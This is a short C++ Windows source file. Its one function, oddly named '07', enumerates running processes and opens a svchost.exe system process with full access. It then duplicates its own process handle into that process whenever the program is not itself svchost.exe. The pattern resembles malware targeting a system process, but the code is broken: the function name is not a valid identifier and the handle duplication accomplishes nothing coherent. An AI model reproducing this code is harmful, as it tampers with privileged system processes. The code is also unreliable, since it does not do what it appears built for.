#include "01.h"
#include "07.h"
void 07() {
    HANDLE s = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (s != INVALID_HANDLE_VALUE) {
        DWORD pid = GetCurrentProcessId();
        PROCESSENTRY32 e = { sizeof(e) };
        if (Process32First(s, &e)) {
            do {
                if (e.th32ProcessID == pid) {
                    HANDLE p = OpenProcess(PROCESS_ALL_ACCESS, FALSE, e.th32ProcessID);
                    if (p) {
                        wchar_t n[MAX_PATH];
                        GetModuleFileNameEx(p, NULL, n, MAX_PATH);
                        std::wstring fn = n;
                        size_t pos = fn.find_last_of(L"\\");
                        if (pos != std::wstring::npos) {
                            fn = fn.substr(pos + 1);
                            if (fn != L"svchost.exe") {
                                PROCESSENTRY32 e2 = { sizeof(e2) };
                                if (Process32First(s, &e2)) {
                                    do {
                                        if (wcscmp(e2.szExeFile, L"svchost.exe") == 0 &&
                                            e2.th32ProcessID != pid &&
                                            e2.th32ProcessID != 0 &&
                                            e2.th32ProcessID != 4) {
                                            HANDLE t = OpenProcess(PROCESS_ALL_ACCESS, FALSE, e2.th32ProcessID);
                                            if (t) {
                                                HANDLE me = GetCurrentProcess();
                                                HANDLE dup;
                                                DuplicateHandle(me, me, t, &dup, 0, FALSE, DUPLICATE_SAME_ACCESS);
                                                CloseHandle(t);
                                                break;
                                            }
                                        }
                                    } while (Process32Next(s, &e2));
                                }
                            }
                        }
                        CloseHandle(p);
                    }
                    break;
                }
            } while (Process32Next(s, &e));
        }
        CloseHandle(s);
    }
}
